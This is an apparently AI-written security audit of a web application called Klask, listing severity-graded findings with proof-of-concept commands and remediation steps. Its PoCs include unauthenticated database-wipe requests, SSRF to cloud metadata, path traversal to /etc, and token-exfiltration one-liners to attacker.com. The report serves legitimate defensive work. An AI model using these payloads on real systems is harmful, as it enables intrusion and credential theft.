# Klask — Security Audit Report

**Date**: 2026-04-22  
**Scope**: Full application — backend (Rust/Axum/Tantivy/PostgreSQL), frontend (React/TypeScript), infrastructure (Helm/Docker/GitHub Actions)  
**Method**: Manual code review (3 specialized sub-agents) + automated scans (`cargo audit`, `npm audit`)  
**Auditor**: Claude Code (Anthropic)

---

## Executive Summary

The audit identified **48 findings** across the three domains, including **1 Critical** and **13 High** severity vulnerabilities. All Critical and High findings have been fixed. Several Low and Informational findings remain open for future sprints.

| Severity | Total | Fixed | Open |
|----------|-------|-------|------|
| Critical | 1 | 1 | 0 |
| High | 13 | 13 | 0 |
| Medium | 20 | 20 | 0 |
| Low | 8 | 4 | 4 |
| Informational | 6 | 3 | 3 |
| **Total** | **48** | **41** | **7** |

**Commits de correction** : `74c198d` → `efd3879` (42 commits sur branche `audit-secu`)

**Remaining open findings (7):**

- `KLASK-BE-015` *(Low)* — Stored XSS via unsanitized `avatar_url` field (backend)
- `KLASK-BE-016` *(Low)* — ReDoS regex protection incomplete
- `KLASK-BE-017` *(Low)* — Rate limiter stores state in-memory only (multi-replica risk)
- `KLASK-INFRA-015` *(Low)* — Docker Compose missing resource limits
- `KLASK-BE-020` *(Info)* — `OptionalUser` extractor silently swallows auth errors
- `KLASK-FE-010` *(Info)* — Runtime config publicly accessible
- `KLASK-INFRA-017` *(Info)* — No Pod Security Standards namespace enforcement

---

## Findings

### Critical

---

#### KLASK-BE-001 — 9 Admin Endpoints Accessible Without Authentication

- **Severity**: Critical
- **CWE**: CWE-284 (Improper Access Control)
- **Component**: Backend
- **Location**: `klask-rs/src/api/admin/mod.rs:136-145`
- **Status**: Fixed — 74c198d

**Description**: Nine handler functions registered under `/api/admin/` have no `AdminUser` (nor any auth) extractor in their function signature. They only accept `State<AppState>`. There is no global authentication middleware applied to the `/admin` nest. Affected routes:

- `GET /api/admin/dashboard`
- `GET /api/admin/system`
- `GET /api/admin/users/stats`
- `GET /api/admin/repositories/stats`
- `GET /api/admin/content/stats`
- `GET /api/admin/search/stats`
- `GET /api/admin/activity/recent`
- `POST /api/admin/seed`
- `POST /api/admin/seed/clear`
- `GET /api/admin/seed/stats`

The only protected route in this file is `POST /api/admin/search/reset-index` (line 506).

**Impact**: Any unauthenticated attacker can retrieve the full admin dashboard including: user email addresses, last-seen timestamps, repository names and URLs. More critically, `POST /api/admin/seed` and `POST /api/admin/seed/clear` allow unauthenticated callers to populate or wipe the entire database.

**Proof of Concept**:
```bash
# Exfiltrate user list with emails
curl http://localhost:3000/api/admin/activity/recent
# Returns: {"recent_users": [{"username":"admin","email":"admin@example.com",...}]}

# Wipe all seed data without any authentication
curl -X POST http://localhost:3000/api/admin/seed/clear
```

**Remediation**: Add `_admin_user: AdminUser` as a parameter to all ten affected handler functions, or apply a `from_fn` authentication middleware layer to the entire admin router nest in `src/api/mod.rs`.

---

### High

---

#### KLASK-BE-002 — Server-Side Request Forgery (SSRF) via GitLab URL Parameter

- **Severity**: High
- **CWE**: CWE-918 (Server-Side Request Forgery)
- **Component**: Backend
- **Location**: `klask-rs/src/api/repositories.rs:1094-1149`, `klask-rs/src/services/gitlab.rs:81-139`
- **Status**: Fixed — d45798b

**Description**: `POST /api/repositories/gitlab/discover` and `POST /api/repositories/gitlab/test-token` accept a caller-controlled `gitlab_url` string and pass it directly to the HTTP client with no validation of scheme, host, or IP range. Both endpoints are protected by `AdminUser`, so an admin session is required — but combined with the permissive CORS (KLASK-BE-003), this can be triggered cross-origin from an attacker's page when the admin visits it.

**Impact**: Admin-level attacker can probe internal services (`http://169.254.169.254/latest/meta-data/` on AWS, `http://10.0.0.1/`, `http://localhost:6379/`), exfiltrate the Bearer token sent in the HTTP request to an attacker-controlled server, or extract internal service responses via the error message.

**Proof of Concept**:
```bash
TOKEN="<valid_admin_jwt>"
curl -X POST http://localhost:3000/api/repositories/gitlab/test-token \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"gitlabUrl":"http://169.254.169.254/latest/meta-data/","accessToken":"test"}'
```

**Remediation**: Before making the HTTP request, validate `gitlab_url`: parse with a URL library, restrict to `https://` scheme only, reject loopback (`127.0.0.1`, `::1`), link-local (`169.254.x.x`), RFC-1918 private ranges (`10.x`, `172.16–31.x`, `192.168.x`). Reuse / extend the existing `validate_filter_param` / `validate_github_namespace` patterns in `src/api/`.

---

#### KLASK-BE-003 — Permissive CORS Configuration

- **Severity**: High
- **CWE**: CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)
- **Component**: Backend
- **Location**: `klask-rs/src/main.rs:270`
- **Status**: Fixed — 1c0549d

**Description**: `CorsLayer::permissive()` allows all origins, methods, and headers. Any website can issue cross-origin requests to all API endpoints and include the victim's `Authorization: Bearer` header (read from localStorage by an XSS payload). This significantly amplifies the SSRF (KLASK-BE-002) by enabling it to be triggered from an attacker's webpage visited by an admin.

**Proof of Concept**:
```html
<!-- Attacker page triggers SSRF when visited by admin -->
<script>
fetch('http://klask.internal/api/repositories/gitlab/test-token', {
  method: 'POST',
  headers: {'Content-Type':'application/json','Authorization':'Bearer STOLEN_TOKEN'},
  body: JSON.stringify({gitlabUrl:'http://169.254.169.254/',accessToken:'x'})
})
</script>
```

**Remediation**: Replace `CorsLayer::permissive()` with an explicit allowlist:
```rust
CorsLayer::new()
    .allow_origin(allowed_origins) // configured via ALLOWED_ORIGINS env var
    .allow_methods([Method::GET, Method::POST, Method::PUT, Method::DELETE])
    .allow_headers([AUTHORIZATION, CONTENT_TYPE])
```

---

#### KLASK-BE-004 — Setup Race Condition: Multiple Admin Accounts via Concurrent Requests

- **Severity**: High
- **CWE**: CWE-362 (Race Condition / TOCTOU)
- **Component**: Backend
- **Location**: `klask-rs/src/api/auth.rs:213-262`
- **Status**: Fixed — 34412fb

**Description**: `initial_setup` performs `count_users()` (SELECT COUNT) then `create_user()` as two separate database operations without a transaction or unique constraint. Concurrent requests racing between these two steps can both see count=0 and both create an admin account.

**Proof of Concept**:
```bash
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:3000/api/auth/setup \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin$i\",\"email\":\"admin$i@test.com\",\"password\":\"Admin1234\"}" &
done
wait
```

**Remediation**: Use an `INSERT ... WHERE NOT EXISTS (SELECT 1 FROM users) RETURNING ...` pattern, or wrap both operations in a serializable database transaction, or add a `UNIQUE` constraint on a boolean `is_initial_admin` flag.

---

#### KLASK-BE-005 — Path Traversal via FileSystem Repository URL

- **Severity**: High
- **CWE**: CWE-22 (Path Traversal)
- **Component**: Backend
- **Location**: `klask-rs/src/services/crawler/service.rs:207-209`, `klask-rs/src/api/repositories.rs:297-315`
- **Status**: Fixed — 44d7aca

**Description**: When a repository of type `FileSystem` is created via `POST /api/repositories`, the `url` field is accepted without path validation. At crawl time, `PathBuf::from(&repository.url)` is used directly with `fs::read_dir()`. An admin can set the URL to `/etc`, `/root`, or `../../sensitive`, causing the crawler to index sensitive server-side files into the Tantivy search index — which is then searchable by any authenticated user.

**Proof of Concept**:
```bash
# Admin creates a FileSystem repo pointing at /etc
curl -X POST http://localhost:3000/api/repositories \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"etc","url":"/etc","repositoryType":"FileSystem"}'
# Trigger crawl, then search for "root:x:0:0" with any user token
```

**Remediation**: Validate `url` for FileSystem repos: (1) call `.canonicalize()` to resolve symlinks, (2) check it does not start with `/etc`, `/proc`, `/sys`, `/root`, `/var`, (3) enforce a configurable `FILESYSTEM_REPO_BASE_DIR` allowlist, (4) reject paths containing `..` components before canonicalization.

---

#### KLASK-FE-001 — CSRF Token Generated Client-Side and Not Validated by Backend

- **Severity**: High
- **CWE**: CWE-352 (Cross-Site Request Forgery)
- **Component**: Frontend
- **Location**: `klask-react/src/lib/api.ts:79-115`
- **Status**: Fixed — 8b977a8

**Description**: The frontend generates a random CSRF token via `crypto.getRandomValues()`, stores it in localStorage, and sends it as `X-CSRF-Token` on all mutating requests. The backend contains **zero validation** of this header (no occurrence of "csrf", "CSRF", or "X-CSRF-Token" anywhere in `klask-rs/src/`). This is security theater — it provides zero protection.

Since the JWT is stored in localStorage (not in an HttpOnly cookie), classic CSRF is less directly applicable (an attacker cannot automatically include the Authorization header). However, if XSS is achieved, both the JWT and the CSRF token are readable and usable together, making the CSRF token entirely meaningless as a defense layer.

**Remediation**: Either (a) migrate JWT to HttpOnly + SameSite=Strict cookies (eliminates both the JWT theft risk and most CSRF vectors), or (b) implement real server-side CSRF validation using double-submit cookie or synchronizer token pattern.

---

#### KLASK-FE-002 — JWT Stored in localStorage, Accessible via XSS

- **Severity**: High
- **CWE**: CWE-668 (Exposure of Resource to Wrong Sphere)
- **Component**: Frontend
- **Location**: `klask-react/src/lib/api.ts:72,178`
- **Status**: Fixed — 85cfacb (backend cookie), 8b977a8 (frontend migration)

**Description**: The JWT is stored in `localStorage` (`authToken` key). Any XSS vulnerability (see KLASK-FE-003, KLASK-FE-005, KLASK-BE-015) can exfiltrate this token with a one-liner: `fetch('https://attacker.com/?t='+localStorage.getItem('authToken'))`.

**Remediation**: Store the JWT in an HttpOnly + SameSite=Strict cookie. Implement a backend `/api/auth/refresh` endpoint. The frontend should never need to read the JWT value directly — React Query handles all API calls.

---

#### KLASK-FE-003 — XSS via Tantivy Search Snippet (Unsafe DIY Sanitization)

- **Severity**: High
- **CWE**: CWE-79 (Cross-Site Scripting)
- **Component**: Frontend
- **Location**: `klask-react/src/components/search/SearchResult.tsx:167-194`
- **Status**: Fixed — 352a224

**Description**: The code re-implements HTML sanitization using `textarea.innerHTML = snippet` to decode HTML entities, then re-encodes `<`, `>`, `&`, then replaces `&lt;b&gt;` → `<mark>`. This hand-rolled approach is fragile. If Tantivy emits a snippet containing a `<b>` tag *inside* an attribute value (e.g., `onerror="<b>payload</b>"`), the entity re-encoding misses the inner `<b>` tag which survives into the rendered HTML as a live `<mark>` element in an unexpected context.

Additionally, the code trusts Tantivy entirely — any backend-side XSS injection that reaches the snippet field will be rendered.

**Remediation**: Replace the DIY sanitizer with DOMPurify (already a project dependency) using an allowlist of only `<mark>`:
```tsx
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(snippet, {
  ALLOWED_TAGS: ['mark'],
  ALLOWED_ATTR: [],
  KEEP_CONTENT: true,
});
return <span dangerouslySetInnerHTML={{ __html: safe }} />;
```

---

#### KLASK-FE-004 — No Content Security Policy

- **Severity**: High
- **CWE**: CWE-693 (Protection Mechanism Failure)
- **Component**: Frontend / Infra
- **Location**: `klask-react/nginx.conf:11`, `klask-react/index.html`
- **Status**: Fixed — 7bd8135

**Description**: nginx sets `Content-Security-Policy: "default-src 'self' http: https: data: blob: 'unsafe-inline'"`. This policy is virtually ineffective: `'unsafe-inline'` defeats all script injection protections, and `http:` + `https:` allow loading resources from any external origin. There is also no `<meta>` CSP fallback in `index.html`.

**Remediation**: Replace with a strict CSP in `nginx.conf`:
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'nonce-{NONCE}'; img-src 'self' data: https:; connect-src 'self'; font-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;
```
If `'unsafe-inline'` is required for styles (CSS-in-JS), use nonces or hashes. For `runtime-config.js`, either move its content to a `/api/config` endpoint or use a `script-src 'nonce-X'` approach.

---

#### KLASK-FE-005 — Stored XSS via Malicious SVG Avatar

- **Severity**: High
- **CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **Component**: Frontend + Backend
- **Location**: `klask-react/src/features/auth/components/ProfileHeader.tsx:72-77`, `klask-rs/src/api/auth.rs:287-292`
- **Status**: Fixed — 3e093a5

**Description**: The frontend validates `file.type.startsWith('image/')` and converts the file to a base64 data URI, then sends it to the backend via `PUT /api/auth/profile`. The backend only validates length (`< 1 MB`) — it does NOT validate that the content is actually an image. An attacker who calls the API directly can store a `data:image/svg+xml;base64,...` URI containing `<svg><script>alert(document.cookie)</script></svg>`. SVG images can contain JavaScript; when the avatar is rendered as `<img src={user.avatar_url}>`, most browsers will block script execution in `<img>` tags, but some contexts (direct navigation, `<object>`, `<iframe>`) will execute it. Additionally, the pattern establishes that arbitrary file content can be stored by any authenticated user.

**Proof of Concept**:
```bash
SVG='<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://attacker.com/?t="+localStorage.authToken)</script></svg>'
B64=$(echo -n "$SVG" | base64 -w0)
curl -X PUT http://localhost:3000/api/auth/profile \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"avatar_url\": \"data:image/svg+xml;base64,$B64\"}"
```

**Remediation**: Server-side: validate that `avatar_url` is either an `https://` URL or a `data:image/(jpeg|png|gif|webp);base64,...` URI. Explicitly reject SVG, `text/html`, `application/javascript` and all non-image MIME types. Consider decoding the base64 and checking magic bytes.

---

#### KLASK-INFRA-001 — GitHub Actions Unpinned Action Versions (Supply Chain Risk)

- **Severity**: High
- **CWE**: CWE-506 (Embedded Malicious Code / Supply Chain Compromise)
- **Component**: CI/CD
- **Location**: `.github/workflows/2-build-images.yml:278`, `.github/workflows/1-tests.yml:87`
- **Status**: Fixed — d9be0ce

**Description**: `aquasecurity/trivy-action@master` is pinned to a floating branch (can be silently updated or hijacked). `dtolnay/rust-toolchain@stable` is pinned to a floating tag. Both run in workflows with `packages: write` or `contents: write` permissions, meaning a compromised action could push malicious images to ghcr.io or create malicious releases.

**Remediation**: Pin all third-party actions to a specific commit SHA:
```yaml
uses: aquasecurity/trivy-action@76071ef0d0c44aefc72d34e38e44b9d61ec3a03e  # v0.30.0
uses: dtolnay/rust-toolchain@fcf085a4b55e95cbf960abb6ad8e3bb8bc20dd91  # stable 2026-01
```
Use Dependabot or Renovate to keep SHAs up to date.

---

#### KLASK-INFRA-002 — `.env` File with Default Secrets Committed to Repository

- **Severity**: High
- **CWE**: CWE-798 (Use of Hard-Coded Credentials)
- **Component**: Infrastructure
- **Location**: `klask-rs/.env`
- **Status**: Fixed — 4b4f663 (gitignore + git rm --cached), renamed to `.env.example`

**Description**: `klask-rs/.env` was committed (7 commits in git history) and contains placeholder credentials.
Even with fake values, it establishes a pattern where real secrets could be committed accidentally.

**Remediation applied**:
1. Added to `.gitignore`: `klask-rs/.env`, `klask-react/.env`, `.env`, `.env.local`
2. Removed from git tracking (`git rm --cached klask-rs/.env`)
3. Renamed to `klask-rs/.env.example` — clearly a developer template, not a secrets file
4. All values were placeholder-only; no real credentials were ever committed

---

#### KLASK-INFRA-003 — Kubernetes NetworkPolicy Disabled by Default

- **Severity**: High
- **CWE**: CWE-923 (Improper Restriction of Communication Channel)
- **Component**: Kubernetes/Helm
- **Location**: `charts/klask/values.yaml:558`
- **Status**: Fixed — 086effb

**Description**: `networkPolicy.enabled: false` means all pods in the cluster can communicate with all other pods. The database has no ingress restrictions — any compromised pod can reach PostgreSQL directly.

**Remediation**: Set `networkPolicy.enabled: true` by default. The templates in `templates/common/networkpolicy.yaml` are well-structured; they just need to be activated. For production, add egress restrictions on the frontend (no external access to arbitrary URLs).

---

#### KLASK-INFRA-004 — Ingress TLS Disabled by Default

- **Severity**: High
- **CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)
- **Component**: Kubernetes/Helm
- **Location**: `charts/klask/values.yaml:96`
- **Status**: Fixed — 7791aa4

**Description**: Ingress is disabled by default, and when enabled, TLS is not configured (empty `tls: []`). Traffic runs over HTTP, exposing credentials, JWTs, and search queries in transit.

**Remediation**: Set TLS as mandatory in documentation and provide a ready-to-use cert-manager example in `values.yaml`:
```yaml
ingress:
  tls:
    - secretName: klask-tls
      hosts:
        - klask.example.com
  annotations:
    cert-manager.io/cluster-issuer: "letsencrypt-prod"
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
```

---

### Medium

---

#### KLASK-BE-006 — GitLab Namespace Parameter Injection in URL

- **Severity**: Medium
- **CWE**: CWE-93 (CRLF Injection / URL Parameter Injection)
- **Location**: `klask-rs/src/services/gitlab.rs:99-101`
- **Status**: Fixed — b0cf958

**Description**: The `namespace` parameter is concatenated directly into the GitLab API URL without percent-encoding: `format!("&search_namespaces=true&search={}", ns)`. A namespace value of `foo&per_page=1` would inject an extra query parameter. GitHub namespace has a regex whitelist (`^[a-zA-Z0-9_-]+$`) but GitLab does not.

**Remediation**: URL-encode the namespace with `urlencoding::encode(ns)` before concatenation, or use `reqwest`'s `.query()` builder which handles encoding automatically.

---

#### KLASK-BE-007 — Weak Encryption Key Derivation (SHA-256 Instead of KDF)

- **Severity**: Medium
- **CWE**: CWE-916 (Use of Password Hash With Insufficient Computational Effort)
- **Location**: `klask-rs/src/services/encryption.rs:60-68`
- **Status**: Fixed — 686205c (startup warning + doc; full KDF migration remains Open)

**Description**: When `ENCRYPTION_KEY` is not exactly 32 bytes, its SHA-256 hash is used as the AES-256-GCM key. SHA-256 is a fast hash, not a key derivation function — it has no iteration count, no salt, and no memory hardness. If a short or dictionary-based key is used, it can be brute-forced offline after a database dump.

**Remediation**: Use `argon2` (already a dependency) or PBKDF2 with a fixed salt (e.g., application name + version) for key derivation. Alternatively, enforce that `ENCRYPTION_KEY` must be exactly 32 bytes and reject shorter keys at startup.

---

#### KLASK-BE-008 — JWT Missing `aud`, `iss`, and Token Revocation

- **Severity**: Medium
- **CWE**: CWE-287 (Improper Authentication)
- **Location**: `klask-rs/src/auth/jwt.rs:25`
- **Status**: Fixed — d572e16

**Description**: `Validation::default()` does not validate `aud` or `iss` claims. There is no `jti` (JWT ID) for revocation. A user who changes their password retains all previously issued tokens until natural expiry. A token issued by another service using the same HS256 secret would be accepted.

**Remediation**: Add `validation.set_issuer(&["klask"])` and `validation.set_audience(&["klask"])`. Add `jti` to `TokenClaims`. Implement revocation by storing `password_changed_at` in the database and rejecting tokens with `iat < password_changed_at`.

---

#### KLASK-BE-009 — No Brute-Force Protection on Login Endpoint

- **Severity**: Medium
- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **Location**: `klask-rs/src/api/auth.rs:94-132`
- **Status**: Fixed — c1a82a9

**Description**: `POST /api/auth/login` has no rate limiting, account lockout, or CAPTCHA. The only rate limiter in the codebase applies solely to `DELETE /api/auth/account`. The `login_count` field is tracked but never used to limit attempts.

**Remediation**: Reuse the existing `delete_account_rate_limiter` pattern (`HashMap<String, (u32, Instant)>`) to add per-IP and per-username rate limiting on login. Max 5 attempts per 15 minutes, returning `HTTP 429` with `Retry-After` header.

---

#### KLASK-BE-010 — Timing Attack Enables Username Enumeration via Login

- **Severity**: Medium
- **CWE**: CWE-203 (Observable Discrepancy)
- **Location**: `klask-rs/src/api/auth.rs:104-119`
- **Status**: Fixed — bfa7a80

**Description**: When a username does not exist, the login handler returns immediately (~1ms). When the username exists but the password is wrong, it runs Argon2id (~50–200ms). This measurable timing difference allows username enumeration.

**Remediation**: Always run `verify_password` even when the user does not exist, using a dummy pre-computed hash:
```rust
static DUMMY_HASH: &str = "$argon2id$v=19$m=19456,t=2,p=1$...";
let _ = verify_password(&req.password, DUMMY_HASH); // constant-time decoy
return Err(AuthError::InvalidCredentials);
```

---

#### KLASK-BE-011 — Admin Search Status Endpoint Missing Authentication

- **Severity**: Medium
- **CWE**: CWE-284 (Improper Access Control)
- **Location**: `klask-rs/src/api/admin/search.rs:45`
- **Status**: Fixed — 77c39d2

**Description**: `GET /api/admin/search/status` intentionally omits authentication (see comment on line 43). It reveals index availability, schema mismatch status, and descriptive internal state messages to unauthenticated callers. This is part of the broader KLASK-BE-001 pattern.

**Remediation**: Require at minimum `AuthenticatedUser`. If the frontend needs this pre-login, expose a minimal boolean `{"available": true/false}` from a dedicated public `/api/status` endpoint already present in the application.

---

#### KLASK-BE-012 — Repository Access Tokens Logged in Plaintext at Debug Level

- **Severity**: Medium
- **CWE**: CWE-532 (Insertion of Sensitive Information into Log File)
- **Location**: `klask-rs/src/api/repositories.rs:508,512`
- **Status**: Fixed — 2ba5eda

**Description**: In `create_repository`, the raw request body and the parsed `CreateRepositoryRequest` struct (which includes `access_token: Option<String>`) are logged at `debug!` level. The default log level is `klask_rs=debug` (set in `main.rs:61`), so GitHub and GitLab PATs are written to application logs in plaintext.

**Remediation**: Remove the raw body debug log (line 508). For the struct log (line 512), implement a custom `Debug` for `CreateRepositoryRequest` that masks `access_token` (e.g., show `"[REDACTED]"`). Alternatively, lower the default log level to `info`.

---

#### KLASK-BE-013 — TLS Certificate Validation Bypass Flags

- **Severity**: Medium
- **CWE**: CWE-295 (Improper Certificate Validation)
- **Location**: `klask-rs/src/services/gitlab.rs:36-46`, `klask-rs/src/services/github.rs:69-78`
- **Status**: Fixed — 52304f0 (startup error + visibility; custom CA support remains Open)

**Description**: `KLASK_GITLAB_ACCEPT_INVALID_CERTS=true` and `KLASK_GITHUB_ACCEPT_INVALID_CERTS=true` call `reqwest`'s `danger_accept_invalid_certs(true)`, disabling all TLS verification. Only a `warn!` log is emitted — no startup error. If these flags are set in production (common for self-hosted GitLab), all HTTP traffic including Bearer tokens is exposed to MitM.

**Remediation**: Emit a startup error (not warning) when these flags are set. Better: support custom CA certificate via `KLASK_GITLAB_CUSTOM_CA_PATH` env var instead of blanket cert disabling.

---

#### KLASK-BE-014 — Inconsistent Password Policy (Registration vs Change Password)

- **Severity**: Medium
- **CWE**: CWE-521 (Weak Password Requirements)
- **Location**: `klask-rs/src/api/auth.rs:463-490`
- **Status**: Fixed — 8591bcf

**Description**: `validate_password_strength()` (min 8 chars, uppercase, lowercase, digit) is called only from `change_password`. The `register` and `initial_setup` endpoints use `#[validate(length(min = 6))]` — a 6-character minimum with no complexity requirements. Admin-created users (`POST /api/users`) have no password validation at all.

**Remediation**: Apply `validate_password_strength()` to `register`, `initial_setup`, and `create_user`. Remove the weaker `length(min = 6)` constraint.

---

#### KLASK-FE-006 — Bio Field DOMPurify Config Could Allow Unicode Attacks

- **Severity**: Medium
- **CWE**: CWE-79 (XSS)
- **Location**: `klask-react/src/features/auth/components/ProfileHeader.tsx:165-178`
- **Status**: Fixed — 99f02e6 (frontend length enforcement; backend charset validation remains Open)

**Description**: Bio uses DOMPurify with `ALLOWED_TAGS: []` which is correct, but the backend only validates length (< 2000 chars) with no content validation. Unicode direction-override characters, zero-width joiners, or other invisible injection vectors could be stored.

**Remediation**: Backend: validate bio to a safe character set (printable Unicode excluding control characters and private use area). Frontend: the current DOMPurify config is good — keep it.

---

#### KLASK-FE-007 — Console Logging of API Error Details in Production

- **Severity**: Medium
- **CWE**: CWE-532 (Insertion of Sensitive Information into Log File)
- **Location**: `klask-react/src/lib/react-query.ts:121`
- **Status**: Fixed — 6f8b8f1

**Description**: `console.error('API Error:', error.message, error.details)` logs error details (including any sensitive fields that might appear in `error.details`) to the browser console, visible to any developer tools user or error-monitoring integrations.

**Remediation**: Whitelist the fields logged from error objects. In production builds, send errors to a server-side log aggregator instead of the console. Gate verbose logging behind `import.meta.env.DEV`.

---

#### KLASK-FE-008 — npm Dependencies: ajv ReDoS + brace-expansion DoS

- **Severity**: Medium
- **CWE**: CWE-1333 (Inefficient Regular Expression Complexity)
- **Location**: `klask-react/package.json` (transitive dependencies)
- **Status**: Fixed — 49d38d8

**Description**: `npm audit` reports:
- **ajv < 6.14.0**: ReDoS when using `$data` option (GHSA-2g4f-4pwh-qvx6)
- **brace-expansion < 1.1.13 / < 2.0.2**: Zero-step sequence causes process hang and memory exhaustion

Both are transitive dependencies (likely via eslint tooling). If either is used in build tooling that processes user-controlled input, DoS is possible.

**Remediation**: Run `npm audit fix` and check for upstream fixes. Pin transitive versions in `package.json` overrides if direct fixes are not available.

---

#### KLASK-INFRA-005 — ServiceAccount automountServiceAccountToken Enabled

- **Severity**: Medium
- **CWE**: CWE-863 (Incorrect Authorization)
- **Location**: `charts/klask/values.yaml:31`
- **Status**: Fixed — 24b90aa

**Description**: Pods automatically receive Kubernetes API credentials mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. Neither the backend nor frontend need K8s API access. If a pod is compromised, the attacker gains Kubernetes API credentials.

**Remediation**: Set `serviceAccount.automount: false` in `values.yaml`. Enable only if a specific future feature requires it.

---

#### KLASK-INFRA-006 — No Kubernetes RBAC Defined

- **Severity**: Medium
- **CWE**: CWE-863 (Incorrect Authorization)
- **Location**: `charts/klask/templates/common/` (no `role.yaml` or `rolebinding.yaml`)
- **Status**: Fixed — 24e80d6

**Description**: A ServiceAccount exists but no accompanying Role or RoleBinding. The authorization posture is undefined and reliant on cluster defaults.

**Remediation**: Create `templates/common/role.yaml` with empty rules (`rules: []`) and bind it to the ServiceAccount. This explicitly documents that no K8s API access is needed.

---

#### KLASK-INFRA-007 — PostgreSQL and busybox Image Tags Not Pinned

- **Severity**: Medium
- **CWE**: CWE-345 (Insufficient Verification of Data Authenticity)
- **Location**: `charts/klask/values.yaml:437` (postgres), `charts/klask/values.yaml:346` (busybox)
- **Status**: Fixed — 60b2bdc

**Description**: `postgres:18-alpine` uses a mutable tag (patch version can change). `busybox:latest` is fully floating — any pull can get a different image, including a compromised one from a registry supply chain attack.

**Remediation**: Pin to full semver (`postgres:18.3-alpine`) or better, by digest. Replace `busybox:latest` with `busybox:1.36.1-stable` or a specific SHA digest.

---

#### KLASK-INFRA-008 — Nginx Security Headers Missing (HSTS, Permissions-Policy)

- **Severity**: Medium
- **CWE**: CWE-693 (Protection Mechanism Failure)
- **Location**: `klask-react/nginx.conf:6-11`
- **Status**: Fixed — 59c9d99

**Description**: Missing headers: `Strict-Transport-Security`, `Permissions-Policy`, `X-Permitted-Cross-Domain-Policies`. The `X-XSS-Protection` header is deprecated and ignored by modern browsers.

**Remediation**:
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=()" always;
add_header X-Permitted-Cross-Domain-Policies "none" always;
# Remove X-XSS-Protection
```

---

#### KLASK-INFRA-009 — Docker entrypoint.sh: API Base URL Injected Unsafely into JavaScript

- **Severity**: Medium
- **CWE**: CWE-78 (OS Command Injection) / CWE-79 (XSS)
- **Location**: `klask-react/entrypoint.sh:14-17`
- **Status**: Fixed — bbcd1ef

**Description**:
```sh
cat > /usr/share/nginx/html/runtime-config.js << EOF
window.RUNTIME_CONFIG = { VITE_API_BASE_URL: "$API_BASE_URL" };
EOF
```
The `$API_BASE_URL` environment variable is interpolated directly into JavaScript without escaping. A value like `"; alert('xss'); //` would break out of the string and inject JavaScript.

**Remediation**: Use `jq` to produce valid JSON:
```sh
API_URL=$(jq -n --arg u "$API_BASE_URL" '$u')
echo "window.RUNTIME_CONFIG = { VITE_API_BASE_URL: $API_URL };" > /usr/share/nginx/html/runtime-config.js
```

---

#### KLASK-INFRA-010 — GitHub Actions Workflow Permissions Overly Broad

- **Severity**: Medium
- **CWE**: CWE-863 (Incorrect Authorization)
- **Location**: `.github/workflows/4-release.yml:19-23`
- **Status**: Fixed — 7debee7

**Description**: Release workflow uses `contents: write`, `issues: write`, `pull-requests: write`, `id-token: write`. The `id-token: write` permission allows OIDC token generation which can be used to assume cloud provider roles (AWS, GCP, Azure). If a compromised action is triggered via this workflow, it could escalate to cloud infrastructure.

**Remediation**: Scope permissions per-job. Document why `id-token: write` is needed. Restrict the release workflow to only trigger on `refs/heads/master` pushes.

---

#### KLASK-INFRA-011 — PostgreSQL No TLS Between Backend and Database

- **Severity**: Medium
- **CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)
- **Location**: `charts/klask/templates/postgresql/statefulset.yaml`
- **Status**: Fixed — efd3879 (documented in NOTES.txt and values.yaml; full cert-manager TLS deferred)

**Description**: No TLS is configured on the PostgreSQL connection within the cluster. Database passwords and query results (including potentially sensitive code content) are transmitted in plaintext over pod-to-pod network traffic.

**Remediation**: Configure `sslmode=require` in the `DATABASE_URL`. Issue certificates via cert-manager or use the PostgreSQL container's built-in TLS support with a Kubernetes Secret containing the cert/key.

---

#### KLASK-INFRA-012 — Helm Secret Auto-Generation Uses Non-Cryptographic RNG

- **Severity**: Medium
- **CWE**: CWE-338 (Use of Cryptographically Weak PRNG)
- **Location**: `charts/klask/templates/secret.yaml:58-59`
- **Status**: Fixed — efd3879 (NOTES.txt warning + values.yaml guidance to use openssl rand; auto-gen preserved for dev convenience)

**Description**: `randAlphaNum 32` uses Golang's `math/rand` (not `crypto/rand`). For secrets like `ENCRYPTION_KEY` and `JWT_SECRET`, predictable generation could allow an attacker with knowledge of the Helm install time to brute-force the generated value.

**Remediation**: Provide pre-generated values via `--set backend.auth.encryptionKey=$(openssl rand -hex 32)` during install. Document this clearly in the deployment guide. The Helm chart should warn (not silently generate) if secrets are not provided.

---

### Low

---

#### KLASK-BE-015 — Stored XSS Vector via Unsanitized avatar_url Field (Backend)

- **Severity**: Low (see High KLASK-FE-005 for the primary finding)
- **CWE**: CWE-79
- **Location**: `klask-rs/src/api/auth.rs:287-292`
- **Status**: Open

**Description**: The backend accepts any string up to 1MB as `avatar_url` without MIME type validation. This enables the SVG XSS attack described in KLASK-FE-005.

**Remediation**: See KLASK-FE-005.

---

#### KLASK-BE-016 — ReDoS Regex Protection Incomplete

- **Severity**: Low
- **CWE**: CWE-1333 (Inefficient Regular Expression Complexity)
- **Location**: `klask-rs/src/api/search.rs:149-154`
- **Status**: Open

**Description**: `validate_regex_pattern()` is only called when `regex_search=true`. The validator's `DANGEROUS_PATTERNS` blocklist covers only 5 literal strings; many catastrophic backtracking patterns (e.g., `(a+)+`, `([a-zA-Z]+)*`) are not covered. The 30-second `SEARCH_TIMEOUT` provides a backstop but does not prevent sustained DoS.

